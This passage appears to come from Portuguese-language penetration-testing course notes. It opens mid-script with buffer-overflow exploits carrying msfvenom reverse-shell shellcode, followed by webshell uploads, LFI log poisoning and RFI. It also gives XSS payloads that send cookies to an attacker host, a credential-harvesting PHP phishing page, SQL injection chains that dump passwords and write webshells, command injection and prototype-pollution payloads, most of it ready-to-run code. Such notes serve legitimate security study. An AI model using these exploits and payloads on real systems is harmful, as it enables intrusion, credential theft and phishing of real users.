	"\x5c\xd0\x3d\xb2\xb2\xb5\x96\x2b\x2a\x9c\x6c\xcd\xb3\x0a\x09"

	"\xcd\x38\xb9\xee\x80\xc8\xb4\xfc\x75\x39\x83\x5e\xd3\x46\x39"

	"\xf6\xbf\xd5\xa6\x06\xc9\xc5\x70\x51\x9e\x38\x89\x37\x32\x62"

	"\x23\x25\xcf\xf2\x0c\xed\x14\xc7\x93\xec\xd9\x73\xb0\xfe\x27"

	"\x7b\xfc\xaa\xf7\x2a\xaa\x04\xbe\x84\x1c\xfe\x68\x7a\xf7\x96"

	"\xed\xb0\xc8\xe0\xf1\x9c\xbe\x0c\x43\x49\x87\x33\x6c\x1d\x0f"

	"\x4c\x90\xbd\xf0\x87\x10\xdd\x12\x0d\x6d\x76\x8b\xc4\xcc\x1b"

	"\x2c\x33\x12\x22\xaf\xb1\xeb\xd1\xaf\xb0\xee\x9e\x77\x29\x83"

	"\x8f\x1d\x4d\x30\xaf\x37")

	send = "A" * 2007 + "\xa0\x12\x50\x62" + "\x90" * 32 + shell

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect(("192.168.2.106", 5800))

	s.recv(1024)

	#print banner

	s.send("SEND "+send+"\r\n")

	#r = s.recv(1024)

	#print r


## DESENVOLVIMENTO DE EXPLOITS WINDOWS 10

    !mona findmsp 

Encontra o número do OffSet para chegar ao EIP e adiciona +4


- Exploit Montado no módulo de dev exploit Win10

.

	#/usr/bin/python/

	import socket

	# /usr/bin/msf-pattern_offset -l 1000 -q 42306142

	# Exact match at offset 780

	# bad chars:  \x00\x0a\x0d\x25\x26\x2b\x3d

	# #dados="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af>

	# 0x10090c83

	# windows/shell_reverse_tcp -b "bad_chars" -f c

	# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.106 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f c


	shell = ("\xb8\xd6\x7e\xbf\x1b\xd9\xcf\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"

	"\x52\x83\xc2\x04\x31\x42\x0e\x03\x94\x70\x5d\xee\xe4\x65\x23"

	"\x11\x14\x76\x44\x9b\xf1\x47\x44\xff\x72\xf7\x74\x8b\xd6\xf4"

	"\xff\xd9\xc2\x8f\x72\xf6\xe5\x38\x38\x20\xc8\xb9\x11\x10\x4b"

	"\x3a\x68\x45\xab\x03\xa3\x98\xaa\x44\xde\x51\xfe\x1d\x94\xc4"

	"\xee\x2a\xe0\xd4\x85\x61\xe4\x5c\x7a\x31\x07\x4c\x2d\x49\x5e"

	"\x4e\xcc\x9e\xea\xc7\xd6\xc3\xd7\x9e\x6d\x37\xa3\x20\xa7\x09"

	"\x4c\x8e\x86\xa5\xbf\xce\xcf\x02\x20\xa5\x39\x71\xdd\xbe\xfe"

	"\x0b\x39\x4a\xe4\xac\xca\xec\xc0\x4d\x1e\x6a\x83\x42\xeb\xf8"

	"\xcb\x46\xea\x2d\x60\x72\x67\xd0\xa6\xf2\x33\xf7\x62\x5e\xe7"

	"\x96\x33\x3a\x46\xa6\x23\xe5\x37\x02\x28\x08\x23\x3f\x73\x45"

	"\x80\x72\x8b\x95\x8e\x05\xf8\xa7\x11\xbe\x96\x8b\xda\x18\x61"

	"\xeb\xf0\xdd\xfd\x12\xfb\x1d\xd4\xd0\xaf\x4d\x4e\xf0\xcf\x05"

	"\x8e\xfd\x05\x89\xde\x51\xf6\x6a\x8e\x11\xa6\x02\xc4\x9d\x99"

	"\x33\xe7\x77\xb2\xde\x12\x10\x7d\xb6\x1e\x8a\x15\xc5\x1e\x4b"

	"\x5d\x40\xf8\x21\xb1\x05\x53\xde\x28\x0c\x2f\x7f\xb4\x9a\x4a"

	"\xbf\x3e\x29\xab\x0e\xb7\x44\xbf\xe7\x37\x13\x9d\xae\x48\x89"

	"\x89\x2d\xda\x56\x49\x3b\xc7\xc0\x1e\x6c\x39\x19\xca\x80\x60"

	"\xb3\xe8\x58\xf4\xfc\xa8\x86\xc5\x03\x31\x4a\x71\x20\x21\x92"

	"\x7a\x6c\x15\x4a\x2d\x3a\xc3\x2c\x87\x8c\xbd\xe6\x74\x47\x29"

	"\x7e\xb7\x58\x2f\x7f\x92\x2e\xcf\xce\x4b\x77\xf0\xff\x1b\x7f"

	"\x89\x1d\xbc\x80\x40\xa6\xdc\x62\x40\xd3\x74\x3b\x01\x5e\x19"

	"\xbc\xfc\x9d\x24\x3f\xf4\x5d\xd3\x5f\x7d\x5b\x9f\xe7\x6e\x11"

	"\xb0\x8d\x90\x86\xb1\x87")


	#dados = "A" * 780 + "\x83\x0c\x09\x10"     + "C" * (1000 - 780)

	dados = "A" * 780 + "\x83\x0c\x09\x10"     + "\x90" * 16 + shell

	tam = len(dados) + 20

	request="POST /login HTTP/1.1\r\n"

	request+="Host: 192.168.254.54\r\n"

	request+="Content-Length: "+str(tam)+"\r\n"

	request+="Cache-Control: max-age=0\r\n"

	request+="Upgrade-Insecure-Requests: 1\r\n"

	request+="Origin: http://192.168.254.54\r\n"

	request+="Content-Type: application/x-www-form-urlencoded\r\n"

	request+="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\n"

	request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"

	request+="Referer: http://192.168.254.54/login\r\n"

	request+="Accept-Encoding: gzip, deflate\r\n"

	request+="Accept-Language: en-US,en;q=0.9\r\n"

	request+="Connection: close\r\n"

	request+="\r\n"

	request+="username="+dados+"&password=A"

	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect(("192.168.2.106", 80))

	s.send(request)

Nota: Resumindo-> Analisa a aplicação, comportamento, faz o primeiro teste que é saber até quantos chars a aplicação crasha, pode se usar o burp suite e testar e depois pegar o código HTML para inserir no script, depois pode se usar o comando do pattern-offset do msf para encontrar o endereço de EIP ou usar o comando !mona findmsp para encontrar o valor que aponta para EIP e usar a seta para poder encontrar o endereço no debugger e usar o f2 para inserir ele no breakpoint e depois encontrar o endereço que faz um JUMP ESP para colocar no EIP, assim apontando para EIP, após isso é necessário gerar códigos ASCII para inserir no programa e identificar os badchars e excluir na hora de gerar o shellcode com o msfvenom e depois inserir o shellcode no script. Com o Immunity debugger deve sempre atentar para restartar o serviço colocar no immunity clicar no botão play, setar um breakpoint para verificar se está correto a inserção do shellcode, lembrar de colocar para escutar na porta informada.


## MECANISMOS DE PROTEÇÃO

DEP - Data prevention execution 

Por padrão não vem habilitado para todos os programas, caso necessário, ativar o DEP para todos os programas /NXCOMPACT [:NO] para fazer programa seguro

ASLR - Deixar os endereços de memórias aleatórios - Evitando encontrar um endereço fixo. Pode habilitar a função no windows ou adicionar o /DINAMICBASE [:NO] no Código do arquivo.


## BUFFER OVERFLOW - LINUX

Comandos do debugger está no módulo acima, em: Comandos do GDB e GDB tui para Debugger linux 

Passa à passo para chegar no exploit final…

    b* 0xendereco 

Com programa utilizado na aula dá um breakpoint do verifica no parâmetro gets

    run < <(python2 -c 'print "A" * 200') 

Roda o comando com buffer de 200chars

    i r 

Olha os registradores

    x/16xw $esp 

Dá um follow nos chars do ESP

    x/16xw $ebp 

Dá um follow nos chars do EBP

    c 

Continua com o breakpoint

    i r 

Olha os registradores


Analisa o LEA que reserva espaço na memória 0x88 = 136

    run < <(python2 -c 'print "A" * 136') 

Roda o comando com buffer de 136chars

    x/16xw $esp  

Dá um follow nos chars do ESP

    x/16xw $ebp 

Dá um follow nos chars do EBP

    run < <(python2 -c 'print "A" * 136 + "BBBB"') 

Roda o comando com buffer com buffer EIP

    x/16xw $esp 

Dá um follow nos chars do ESP

    x/16xw $ebp 

Dá um follow nos chars do EBP

    run < <(python2 -c 'print "A" * 136 + "BBBB" + "CCCC"') 

Roda o comando com buffer com buffer EIP + validação

    x/16xw $esp 

Dá um follow nos chars do ESP

    x/16xw $ebp 

Dá um follow nos chars do EBP

    c  

Continua com o breakpoint

    i r 

Olha os registradores


Pega o endereço de acessar 0x56556270

    run < <(python2 -c 'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"')

Roda e insere com os chars específicos para o buffer

    i r 

Olha os registradores

    x/16xw $esp  

Dá um follow nos chars do ESP

    c 

Continua com o breakpoint


- Dicas Debugger

.

    b*  main 

Seta breakpoint em main

    disas verifica 

Abre os endereços e códigos da parte verifica

    set $eip  = 0x56556270 ou $eip 

Seta o endereço em EIP

    d 

Deleta os breakpoints

    disas verifica 

Abre os endereços e códigos da parte verifica

    b* 0x5655626e 

Seta breakpoint no endereço informado

    x/20s $eip 

Dá um dump nas infos gravadas no EIP


- Exploração de binário (desafio)

.

    nc 192.200.0.10 8888 

Sistema vulnerável para ganhar acesso com buffer overflow (./desafio)

    info functions 

Dá uma olhada nas funções do sistema

    disas main  

Abre os endereços e códigos da parte Main

    run < <(python2 -c 'print "A" * 150') 

Roda o comando com buffer de 150chars

    b *  0x0804855b 

Seta breakpoint no endereço informado

    c 

Continua com o programa rodando depois do breakpoint

    x/20xw $esp 

Dá um dump nas infos gravadas no ESP

    i r 

Olha os registradores


- Usar o patternCreate

.

    run < <(python2 -c 'print "A" * 136 + "BBBB"') 

Roda o comando com buffer de 136 chars + EIP

    c 

Continua com o programa rodando depois do breakpoint


- Add o endereço da função do exploit 0x080484c0 no exploit

.

    run < <(python2 -c 'print "A" * 136 + "\x0c\x84\x04\x08" ') 

Roda o comando com buffer de 136chars + EIP e o endereço de exploração que chama o exploit descoberto acima

    c 

Continua com o programa rodando depois do breakpoint

    python2 -c 'print "A" * 136 + "\x0c\x84\x04\x08" ' | nc 192.200.0.10 8888  

Exploit já criado pronto para ser executado no servidor que se encontra o programa.



## TRABALHANDO COM EXPLOITS PÚBLICOS


Base de dados de exploits

        Exploit-db.com
        Packerstormsecurity.com
        Securityfocus.com
        Cve.mitre.org
.

	site:exploit-db.com "ipfire" 

Pesquisa no google por vulnerabilidade no site passado

    searchsploit -u 

Update a database de exploits (Tem a base de dados do exploit-db)

    searchsploit webmin 

Procura pelo exploit do serviço informado

    searchsploit webmin --exclude="phpMy|Dans" 

Filtros de exploits quando vem algo indesejado

    searchsploit -e smb 

Procura exatamente pelo termo informado

    searchsploit --id -m 41149 

Copia o exploit para o diretório atual (para exibir o ID é só passar o --id)


- Usando o exploit em C para vulnerabilidade do syncbreeze

`mingw` Instalar software compilador do exploit para windows, o gcc não compila devido as libraries

    i686-w64-mingw32-gcc 42341.c -o exploit.exe -lws2_32 

Compila o código executável (exploit)



## PENTEST WEB - WEB HACKING


Ferramentas: Gobuster, burp suite , [homebrew](https://epi052.github.io/feroxbuster-docs/docs/installation/install-homebrew/)

    http://burp Para baixar o certificado e configurar no navegador.
    FoxProxy Plugin para ativar e desativar o proxy sem precisar ficar configurando
    CookieManager Manipular cookies e fazer testes

Nota: Php não mostra o código fonte próprio, mas o HTML e JS sim.

- Comandos MySQL

.

Todos os comandos são intuitivos, não precisa de descrição...

    sudo service start mysql
    sudo mysql
    show databases;
    select database();
    select user();
    select version();
    create database Kidman;
    use kidman;
    show tables;
    create table usuarios
        (id int primary key auto_increment,
        login varchar(20) not null,
        senha varchar(20) not null);
    describe usuarios;
    select id from usuarios;
    insert into usuarios values ('1','admin','admin');
    insert into users (id, login, pass) values ('1','admin','admin');
    select * from usuarios;
    selec login from usuarios;
    select * usuarios where senha="admin"
    select * usuarios order by login;
    delete from usuarios where id="7";

    use mysql;
    show tables;
    describe user;
    select host, user, password from user;
    create user ygor identified by 'senha123';
    GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION;
    GRANT ALL PRIVILEGES ON database_name. * TO 'username'@'localhost' identified by 'p4$$';
    alter user 'root'@'localhost' identified with mysql_native_password by 'root';
    use informatio_schema;
    show tables;
    select * schemata; Traz todas as bases de dados
    describe tables;
    select table_schema, table_name from tables; 
    
Traz todas as tabelas de todos os bancos

    select table_name from tables where table_schema="kidman"; 

Mostra diretamente as tabelas da base kidman

    describe columns;
    select column_name from columns where table_schema="kidman"; 

Faz um filtro para mostrar a tabela usuarios da base kidman

    use kidman;
    select login,senha from usuarios;
    select concat(login, ':' ,senha) from usuarios 

Coloca uma concatenação no que o comando traz deixando mais simples

    select @@version
    select 45+54
    select load_file('/var/www/html/index.html'); 

Carrega arquivo dentro do sgdb

    select sleep(10); 

Aguarda em segundos a resposta do banco

    select char(55); 

Taz um caractere correspondente

    select length("kidman");
    select substring("kidman",1,3); 

Traz as 3 primeiras letras da palavra

    drop database teste;
    source \home\user\Desktop\test.sql;


- Sql Injection

.

	select * from user where login='user' and senha='1234';

	select * from user where login='hacker' or 1=1;# senha='1234';

	select * from user where login='user' or 1=1;#

	select * from user where login='user' or 1=1-- -

	select * from user where login='user' or true limit 1;#

	select * from user where login='user' and login='user' limit 1;#

 	create a duplicated user like `"darren"` as `" darren"` with a space in the beginning to authenticate with the same privilleges
	
.

    gobuster dir -u -e http://192.168.1.10 -u /wordlist.txt -s "200,301,302,401" -a user-agent

Bruteforce de diretórios filtrando cod http e user agent

    gobuster dir -u -e http://192.168.1.10 -u /wordlist.txt -s "200,301,302,401" -x .php,.txt,.sql,.bkp

Bruteforce de diretórios filtrando cod http e extensão de arquivos.

    curl -v -X OPTIONS http://192.168.1.10 

Verifica todos os métodos do diretório, passar os outros dirs

    nc -v 192.168.1.10 80 -C | PUT /webdav/ HTTP/1.1 host: 192.168.1.10 

Testando o metodo PUT

    nc -v 192.168.1.10 80 -C | DELETE /webdav/ HTTP/1.1 host: 192.168.1.10 

Testando o metodo PUT

    curl -v -X PUT http://192.168.1.10/webdav/test.txt 

Cria um arquivo no DIR

    curl -v -X DELETE http://192.168.1.10/webdav/test.txt 

Deleta o arquivo do DIR


Nota: CVE-2017-12615 Vulnerabilidade de exploração do método PUT no webdav

    curl -v -X PUT -d "<?php system('id');?>" https://192.168.1.10/webdav/comand.php 

Envia comando em php para interpretar e ganhar acesso ao host.

    curl -v -X PUT -d "<?php system(\$_GET["kidman"])?>" http://192.168.1.10/webdav/com_par.php

Na URL passa o parâmetro /?kidman=cat /etc/passwd Explora podendo executar comandos

    curl -v http://192.168.1.10/webdav/ --upload-file shell.php 

Fazer upload do código em php para o dir

    shell.php <?php system($_GET["kidman"]); ?> 

Arquivo shell para chamar na URL e executar comandos (/?kidman=cat /etc/passwd)

    cadaver http://192.168.1.10/webdav/

Ferramenta para invadir o host podendo dá um HELP e ver o comandos disponíveis

    davtest --url http://192.168.1.10/webdav/ 

Testa a aplicação e retorno sobre os tipos de arquivos aceitos

    curl -c -X POST http://192.168.1.10/logs 

Da bypass no diretório que estava pedindo autenticação, mas só funciona se a página aceitar o método POST

[Curl POST Examples] (https://reqbin.com/req/c-g5d14cew/curl-post-example)
Nota: Atentar para vetores de ataques que podem ser: Métodos, campos de formulários, comportamento da página, ver código fonte, procurar por redirecionamentos dentro do site, podendo gerar uma página fake e enganar o usuário...

- Código em PHP para usar em páginas falsas:

.

	<?php

	$caixa1 = $_POST["login"] . "\n";

	$caixa2 = $_POST["senha"] . "\n";

	$file = fopen("senhas.txt", "a");

	$escrever1 = fwrite($file, $caixa1);

	$escrever2 = fwrite($file, $caixa2);

	fclose($file); 

	header("Location: http://192.168.1.10/turismo/login.php")

	?>

Nota: Observar link de reset de senha para ver se o email não passou o email codificado, podendo assim trocar a codificação por outra de outro email para fazer o takeover da outra conta. Assim como o redirect que contém codificação que pode ser trocada por outra e fazer o ataque de phishing.

- Patch Transversal

Falhas em diretórios com erros na aplicação, parâmetros indefinidos... Sempre observar o código fonte. É quando a aplicação permite ver o patch dos arquivos locais.

    http://192.168.1.10/turismo/logado.php?banners=/../../ 

Banners era um parâmetro indefinido que foi passado por parâmetro com falha 


- Sql Injection

.

    hacker' or 1=1 limit 1;# 

Usar dentro do campo de login ou senha

    hacker' and id=1 limit 1;# 

Usar dentro do campo de login ou senha

Métodos usados para fazer autenticação ou pelo menos tentar verificar se é vulnerável ou não à SQL Inj

LFI = Local File Inclusion

Identificar parâmetros na aplicação com LFI, colocando /../ e verificando o comportamento do parâmetro. Quando a aplicação forçar o .php ou outra extensão no final do arquivo, basta adicionar %00 para ignorar o resto da string

Exemplos abaixo:

        http://192.168.1.10/turismo/info.php?p=/../../../../

LFI - Windows List [FOR MORE](https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e) [SOURCE](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/lfi-rfi)

	C:\Windows\System32\drivers\etc\hosts
	c:\WINDOWS\system32\eula.txt
	c:\WINDOWS\system32\
 	c:\boot.ini  
	c:\WINDOWS\win.ini  
	c:\WINNT\win.ini  
	c:\WINDOWS\Repair\SAM  
	c:\WINDOWS\php.ini  
	c:\WINNT\php.ini  
	c:\Program Files\Apache Group\Apache\conf\httpd.conf  
	c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
	c:\Program Files\xampp\apache\conf\httpd.conf  
	c:\php\php.ini  
	c:\php5\php.ini  
	c:\php4\php.ini  
	c:\apache\php\php.ini  
	c:\xampp\apache\bin\php.ini  
	c:\home2\bin\stable\apache\php.ini  
	c:\home\bin\stable\apache\php.ini

- LFI -> RCE = Inserção de código no LOG

.

    http://192.168.1.10/turismo/info.php?p=/../../../../var/log/apache2/access.log 

Para acesso ao log injetar via `nc -v 192.168.1.10 80 -C` a shell `<?php system(\$_GET['kidman']);?>` via requisição e depois colocar no final da URL `/access.log&kidman=ifconfig`. Podendo ser inserido também usando o `user-agent` com o burp. Verificar se o host também dispõe de outras portas abertas, por exemplo a 25 para fazer a exploração SMTP e por aí vai.

1. Parte Email a Reverse Shell 

        https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/

2. SMTP Log Poisoning through LFI to RCE | SMTP PenTest

        https://youtu.be/-7sTypl3pNg

3. SMTP Log Poisoning through LFI to Remote Code Execution

        https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/

        https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/

        ssh '<?php system($_GET['kid']); ?>'@192.168.1.129 SSH TO RCE POISON
	
        nmap -p 22 --script ssh-brute --script-args userdb=user.txt,passdb=pas.txt,ssh-brute.timeout=4s 192.168.161.75 PAYLOAD '<?php system($_GET['kid']);?>' VAI DENTRO DE USERS

Opções de testes de leitura de arquivo: /var/log/auth.log /var/log/mail.log /var/spool/mail/www-data&kid=ls -la

	telnet 192.200.0.128 25                                      

	Trying 192.200.0.128...

	Connected to 192.200.0.128.

	Escape character is '^]'.

	mail from:www-data

	220 ubuntu.bloi.com.br ESMTP Postfix (Ubuntu)

	250 2.1.0 Ok

	rcpt to:www-data@ubuntu.local

	250 2.1.5 Ok

	data

	354 End data with <CR><LF>.<CR><LF>

	<?php system($_GET['kid']);?>                                          

	. (lembrar de colocar o ponto e dar enter)

	250 2.0.0 Ok: queued as 1C767C001F

	quit

	221 2.0.0 Bye

	Connection closed by foreign host.


- RFI: Remote File Intrusion

.

    http://192.168.1.10/turismo/link.php?link=http://192.168.254.51:8080/injecao&kidman=ls 

Consiste em criar um servidor para pegar o redirecionamento que é feito externamente para mudar pra dentro do arquivo no servidor hacker com código malicioso assim tomando controle podendo usar comandos.


- HTML injection

Procurar campos de formulários para a inserção de códigos HTML, podendo assim, adicionar texto, href, campos de dados...

    http://192.168.1.10/turismo/procurar.php?busca=%3Ch1%3EPentester%3C%2Fh1%3E

Foi inserido o código `<h1>Pentester</h1>` dentro do formulário. Podendo ser inserido um href para redirecionar para outra página (fake) `<a href=http://192.168.254.51>DESCONTÃO</a>`


- XSS Cross Site Scripting - refletido

Executar scripts JS dentro do campo de formulário, podendo também redirecionar para uma página fake ou roubar cookies... 

Ex.: 

    <script>alert('Pentester')</script> 

Printa uma alert com o texto informado.

    <script>document.location="http://192.168.10.1"</script> 

Redirecionamento para outra página

    <script>alert(document.cookies)</script>

Roubo de cookies


- SELF-XSS

Injetar código na página depois de notar como a aplicação se comporta depois de colocar uma `/` após a extensão da página que recebe um parâmetro `/procurar.php?busca=` ficando assim `/procurar.php/`. Se a página quebrar, pode testar a injeção de código JS como `...php/"><script>alert("Hakd")</script>`

- Stored XSS: Sequestro de Sessão

Consiste em armazenar código JS em banco de dados, através de um campo de formulário

Ao identificar este campo, pode-se abrir um serviço http via python e enviar uma requisição JS para esta máquina com o PHPSESSID (Cookie) através do script: 

    no server: 192.168.1.250 <script>new Image().src="http://192.200.1.120:8080/?="+document.cookie;</script> 

Esse script envia dados para o serviço aberto na máquina do atacante. Na máquina atacante vai chegar o cookie da sessão da máquina vítima, depois adiciona o cookie `<script>alert(document.cookie="COOKIECAPT")</script>`


- Automatizando os testes: XSS

Ferramenta XSSSTRIKE no github. Ferramenta que faz a busca por vulnerabilidades XSS

    python3 xsstrike.py -u "http://192.168.1.10/turismo/procurar.php?busca=" 

Faz teste no paramet

    python3 sxxtrile.py -u "http://192.168.1.10/turismo/procurar.php" --params 

Procura por paramt

    python3 xsstrike.py -u "http://192.168.1.10/turismo/procurar.php/" --path 

Faz um patch transversal

[Bypass XSS](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

- URL Encode

É a codificação que a url usa nos caracteres especiais ou acento. & e # deve ser passado pelo code pelo fato de ignorar os caracteres seguintes, dessa forma não se deve passar direto na URL e sim o cód correspondente.

- SQL Injection Error Based

Quando ao inserir um \ ou ' no final do parâmetro, retorna um erro de sintaxe do sql, nesse caso identificando o erro e podendo explorar a vulnerabilidade.

    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,3,4,5 %23 

Teste sql onde o número representa a quantidade de colunas, quando não retornar mais erro, o número é a quantidade de colunas daquela tabela %23 representa o # no url encode

    192.168.1.10/turismo/agencias.php?loja=sp' order by 1,2,3,4,5' 

Também serve para fazer o teste que é de ordenação. No lugar dos números pode se passar version() user() database() 

Ficando assim:

        192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,version(),user (),database() %23


- SQLi Information Schema

Fazer consulta na base information schema onde tem todas as tabelas de todos os bancos.

    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,table_name,4,5 from information_schema.tables%23 

Faz a consulta no banco e traz todas as tabelas de todas as bases

    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,table_name,4,5 from information_schema.tables where table_schema="dbmrtur" %23 

Faz a consulta no banco e traz as tabelas apenas da base dbmrtur

    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,culumn_name,4,5 from information_schema.columns where table_schema="dbmrtur"%23 

Faz a consulta de todas as colunas da base dbmrtur

    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema="dbmrtur" %23 

Faz a concatenação das tabelas para ficar fácil a adivinhação dos nomes das tabelas na hora da enumeração com o Burp e o Length(group_concat()) pra pegar o tamanho

    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,column_name,4,5 from information_schema.columns where table_schema="dbmrtur" and table_name="mrusers"%23 

Faz a consulta das colunas da informations schema na base dbmrtur trazendo as colunas da tabela mrusers

    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,nome,login,senha from mrusers %23 Traz nome login e senha da base bdmrtur na tabela mrusers

    192.168.1.10/turismo/agencias.php?loja=sp' union select 1,2,concat(login,':',senha),4,5 from mrusers %23 

Faz a busca por login e senha concatenados, usar quando houver poucas tabelas (espaços para consulta)


- SQLi -> RCE

Fazer o carregamento de arquivos através da falha de SQL Injection error based

    192.168.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,load_file("/etc/passwd") %23 

Ler arquivo através da falha

    192.168.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,"KidMan" INTO OUTFILE "/var/www/html/turismo/banner/kidman.txt" %23 

Encontrar arquivo que tenha permissão de escrita para inserir o arquivo

    192.168.1.10/turismo/agencias.php?loja=' union all select 1,2,3,4,"<?php system($_GET['hacker']);?>" INTO OUTFILE "/var/www/html/turismo/banners/kid.php" %23 

Insere um código em PHP no diretório para usar o parâmetro e executar códigos na página

    192.168.1.10/turismo/banners/rce.php?hacker=ifconfig 

Usa o arquivo criado para inserir comandos


- SQLi Manualmente

Nota: 	Geralmente quando a página traz um id não dá pra fazer a injeção SQL usando a "aspas simples" no início pelo fato de quebrar a consulta (observar o erro), neste caso deve-se usar sem as aspas simples e usar da mesma forma como é mostrado na SQLi Information Schema. Se montar a query com as aspas simples e ele der erro de sintaxe é porque deve-se usar sem as aspas.

- Bypass Addslashes

Quando a aplicação tem o addslashes, ela adiciona ao final de cada consulta na url uma `\` Para impedir a consulta sql via URL, e nisso vai aparecer um erro de sintaxe, porém um modo de burlar essa consulta é adicionando o `char(100,15,236,145)` correspondente à consulta, por exemplo, ao invés de colocar `table_schema="dbmrtur"` Colocar `table_schema=char(100,98,109,114,116,117,114)`

- SQL Injection em PostgreSQL ver SQLi Information Schema

A sintaxe muda um pouco mas é basicamente a mesma estrutura. Quando no `union select` não aceitar os números `1 2 3` colocar `null,null,null` e quando for fazer o teste de string colocar `'teste'` sem usar o `%23`. Para ver as informações do banco, usar `current_database()`, `current_user`, `version()`. A diferença do Mysql é que ao invés de usar `where table_schema` usar `table_catalog=''` quando for fazer a consulta das credenciais usar `null,login||'-'||password|` Deve usar o pipe para separar a concatenação. Host usado na aula: 192.168.1.9

Nota: Na requisição montar com a palavra null ou o número na frente ficando null from information... ou 5 from information...

- Blind SQL Injection 

É fazer o teste de SQL não somente com o `'` mas com o comando booleano `hack' or 1=1#` Ou outra lógica para dar bypass (192.168.1.5)

- Blind POST SQL Injection

Usando o BURP para testar as requisições e validar se a aplicação responde corretamente. Para dar bypass nessa vulnerabilidade deve usar os caracteres em decimal e ir perguntando para a aplicação se é verdadeiro ou não.

    cond_valid' and database() = char(116,117,114,105,115,109,111)%23

Pergunta o nome da base

    cond_valid' and length(database()) = 7%23 

Pergunta para aplicação o tamanho do nome da base de dados

    cond_valid' and ascii(substring(database(),1,1)) = 100%23 

Pergunta se a primeira letra é 100 para perguntar a segunda letra basta alterar ,1,1 para ,2,1

    cond_valid' and (select length(group_concat(table_name)) = 35 from information_schema.tables where table_schema="dbmrtur")%23 

O numero altera de acordo com a dedução do tamanho da tabela

    cond_valid' and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="dbmrtur"),1,1)) = 97%23  

Chutar as letras para encontrar os nomes das tabelas.

    cond_valid' and ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="dbmrtur" and table_name="adm"),1,1)) = 105%23 

Chutar as colunas da tabela informada

    cond_valid' and ascii(substring((select login from adm limit 0,1),1,1)) = 97%23 

Chutar os dados das colunas


- Time Based SQLi

Baseada em tempo faz uma requisição colocando a aplicação para dar um sleep de tantos segundos, se ela demorar responder, ele é vulnerável.

    ' or sleep(4)%23 

Verifica se a aplicação aguarda 4s

    ' or if (length(database()) = 7 , sleep(4),0)%23 

Valida o tamanho da database

    ' or if (database() = char(100,98,109,114,116,117,114) , sleep(4),0)%23 

Adivinha os char da database

    ' or if(ascii(substring(database(),1,1)) = 100, sleep(3),0)%23

Chuta os char da database um por um


- Automatizando os testes SQLi - SQLMap

.

    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" --current-db

    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" --dbs

    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" -D dbmrtur --tables

    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" -D dbmrtur -T mrusers --columns

    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" -D dbmrtur -T mrusers --columns -C 'login,senha' --dump

    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" -D dbmrtur -T mrusers --columns -C 'login,senha' --where "ativo='1'" --dump

    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" --current-user

    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" --users

    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" --passwords

    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" --os-shell

    sqlmap -u "192.168.1.10/turismo/turismo/login.php" --forms


- Command Injection

Identificar na aplicação a possibilidade de injetar comandos depois de entender o funcionamento da aplicação, um dos testes a se fazer é `;ls;#` ponto e vírgula serve para finalizar o comando e iniciar outro e o `#` serve para ignorar o que vier depois ou `;cat /etc/passwd;#`

- Prototype Pollution

Alguns payloads que podem ser inseridos nos campos login e senha com o intuito de explorar a vulnerabilidade de protorype pollution

	{\"__proto__\": { \"isAdmin \": true }}
	{\"__proto__\":{\"execArgv\":[\"/bin/sh\"]}}
	{\"__proto__\":{\"isAdmin\":true}}
	{\"constructor\": {\"prototype\": {\"shell\": \"/bin/sh\"}}}

- Automatizando os Testes Command Injection - COMMIX

A ferramenta commix serve para automatizar o command injection, deve-se identificar se a aplicação é `POST` ou não e informar o parâmetro que no caso do exemplo abaixo é `site=`

    commix --url http://192.168.1.10/hosting/ --data="site=kidmancorp.com.br"

- Enumerando campos com Intruder

